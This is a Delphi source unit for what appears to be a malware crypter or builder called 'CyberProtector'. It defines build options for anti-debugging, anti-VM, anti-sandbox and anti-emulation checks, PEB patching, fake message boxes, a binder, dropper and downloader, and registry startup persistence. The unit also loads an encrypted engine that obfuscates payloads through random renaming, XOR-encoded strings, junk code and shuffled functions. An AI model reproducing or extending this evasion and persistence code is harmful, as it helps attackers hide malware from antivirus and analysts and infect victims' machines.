unit U_Engine;

interface
//{$I Build.inc}
uses
{$IFDEF DebugMode}codesitelogging,{$ENDIF}
windows, sysutils, classes,
rsStorage, rsAesEncryptor, rsBinData,
PaxProgram, PaxCompiler,PaxInvoke,PaxRegister,dsrAES,
U_HashList,U_WuManber;

type
TBuildInfo = packed record
  projectname : ansistring;
  Debug : boolean;
  CompressMethod : integer;
  EncryptionMethod : integer;
  AntiDebug : boolean;
  AntiMonitor : boolean;
  AntiSandbox : boolean;
  AntiVM : boolean;
  AntiEmul : boolean;
  EncKey : ansistring;
  Cryptdata : ansistring;
  BufferMethod : integer;
  ResourceName : ansistring;
  Restype : ansistring;
  ResSplit : ansistring;
  ActiveFakeM : boolean;
  MessageType : integer;
  MessageText : ansistring;
  MessageCaption : ansistring;
  MessageButton : ansistring;
  PatchPeb : boolean;
  usepath : boolean;
  havebrowser : boolean;
  havedrop : boolean;
  havebinder :boolean;
  havedownloader : boolean;
  haveStartup :boolean;
  hklm :boolean;
  hklmkey : ansistring;
  hkcu :boolean;
  hkcukey : ansistring;
  Policies :boolean;
  Policieskey : ansistring;
  Activex :boolean;
  Activexkey : ansistring;
  ComponentID : ansistring;
  Vesion : ansistring;
  hardwareid : cardinal;
end;
TMaincode =function (Info:TBuildInfo) :ansistring;

var
MyProg: TPaxProgram;
NameList : TGpStringHash;
garbageasm : array of string;
Engine:Pointer;

function LoadEngine(filename,key:string):boolean;
function GetName(str:ansistring):ansistring;
implementation
uses
U_Chiper,U_Encryption,U_Utils,forms;

function generatename(c,m:integer) :ansistring;
var
  S,Chars: ansistring;
  i, N: integer;
begin
  Chars := 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  if (m <> 0) then
  begin
    if c < m then c := m;
  end;
  Randomize;
  S := '';
  for i := 1 to c do begin
    N := Random(Length(Chars)) + 1;
    S := S + Chars[N];
  end;
  result := S;
end;


Function FindList(str:string):string;
var
temp : string;
begin
  try
    temp := Namelist.ValueOf(str);
  Except
    temp := '';
  end;
  if (temp = '') then
  begin
    randomize;
    temp := genkey(random(60));
    Namelist.Add(str,temp);
    result := temp;
    //Namelist.Add(str,str);
    //result := str;
  end else result := temp;
end;

function GetName(str:ansistring):ansistring;
begin
  result := ansistring(FindList(string(str)));
end;

function ExIntToHex(Value: Integer; Digits: Integer): ansistring;
begin
  result := ansistring(inttohex(Value,digits));
end;

Function GetString(str:ansistring):ansistring;
var
key : ansistring;
begin
  key := generatename(10,0);
  result := ''+GetName('BXor')+'('+ansistring(strtoordinary(BXor(str,key)))+','''+key+''')';
end;

procedure Shuffle(var Elements: array of integer);
var i, j: integer; temp: integer;
begin
  randomize;
  for i := (length(Elements) - 1) downto 1 do
  begin
    j := Random(i+1);
    temp := Elements[i];
    Elements[i] := Elements[j];
    Elements[j] := temp
  end;
end;

Function RandomFunc(const temp:array of ansistring):ansistring;
var
item : array of integer;
i : integer;
begin
  setlength(item,length(temp));
  for i := 0 to length(item)-1 do item[i] := i;
  Shuffle(item);
  for i := 0 to length(item)-1 do result := result+ temp[item[i]];
end;

function JunkGenerator:Ansistring;
begin
  randomize;
  result := ansistring(garbageasm[random(length(garbageasm))]);
end;

function LoadEngine(filename,key:string):boolean;
var
Data: TrsBinData;
cryptor: TrsAesEncryptor;
xstorage: TrsStorage;
Stream : TMemorystream;
junkcount : integer;
i : integer;
App : string;
{$IFDEF DebugMode}BuildInfo : TBuildInfo;{$ENDIF}
KeyEncryption : TKey128;
pathex,patname : string;
begin
  {$I SE_PROTECT_START_ULTRA.inc}
  GenerateMD5KeyA(KeyEncryption,ansistring(key));
  key := BufferToHex(KeyEncryption,length(KeyEncryption));
  result := false;
  if not fileexists(filename) then
  begin
    exit;
  end;
  Data := TrsBinData.Create(nil);
  cryptor:= TrsAesEncryptor.Create(nil);
  xstorage:= TrsStorage.Create(nil);
  Stream := TMemoryStream.Create;
  MyProg := TPaxProgram.Create(nil);
  try
    setlength(garbageasm,0);
    Data.FileName := filename;
    Data.Options := [];
    cryptor.KeyBits := ck256;
    cryptor.EncryptAll := true;
    cryptor.Key := key;
    xstorage.Encryptor := cryptor;
    xstorage.StorageData := Data;
    xstorage.Load;
    App  := xstorage.ReadString('Application','');
    {$IFDEF DebugMode}
    codesite.send('application',App);
    {$ENDIF}
    if (App = 'CyberProtector') then
    begin
      junkcount := xstorage.ReadInteger('JunkCount',0);
      if junkcount <> 0 then
      begin
        setlength(garbageasm,junkcount);
        for i := 0 to junkcount - 1 do
        begin
          garbageasm[i] := xstorage.ReadString('JunkCode'+inttostr(i),'');
        end;
      end;
      junkcount := xstorage.ReadInteger('PatternCount',0);
      if junkcount <> 0 then
      begin
        for i := 0 to junkcount - 1 do
        begin
          pathex := xstorage.ReadString('Pattern'+inttostr(i)+'hex','');
          patname := xstorage.ReadString('Pattern'+inttostr(i)+'Name','');
          WuMach.AddPattern(pathex,patname);
        end;
      end;
      WuMach.InitHash;
      xstorage.ReadStream('Engine',Stream);
      Stream.Position := 0;
      MyProg.LoadFromStream(Stream);
      MyProg.RegisterMember(0, 'ExIntToHex', @ExIntToHex);
      MyProg.RegisterMember(0, 'CrcansiString', @CrcansiString);
      MyProg.RegisterMember(0, 'GetString', @GetString);
      MyProg.RegisterMember(0, 'GetName', @GetName);
      MyProg.RegisterMember(0, 'RandomFunc', @RandomFunc);
      MyProg.RegisterMember(0, 'JunkGenerator', @JunkGenerator);
      MyProg.MapLocal;
      MyProg.Run;
      Engine := MyProg.GetAddress('Maincode');
      if assigned(Engine) then
      begin
        {$IFDEF DebugMode}
        BuildInfo.Debug := true;
        BuildInfo.CompressMethod := 2;
        BuildInfo.AntiDebug := true;
        buildinfo.AntiMonitor := true;
        buildinfo.AntiSandbox := true;
        buildinfo.AntiVM := true;
        buildinfo.AntiEmul := true;
        BuildInfo.EncKey := 'testing';
        BuildInfo.Cryptdata := 'testing';
        BuildInfo.EncryptionMethod := 0;
        codesite.send( string(TMaincode(Engine)(BuildInfo)));
        {$ENDIF}
        result := true;
      end;
      end else
      begin
        application.Terminate;
      end;
  finally
    xstorage.Free;
    Data.Free;
    cryptor.Free;
    Stream.Free;
  end;
  {$I SE_PROTECT_END.inc}
end;

end.
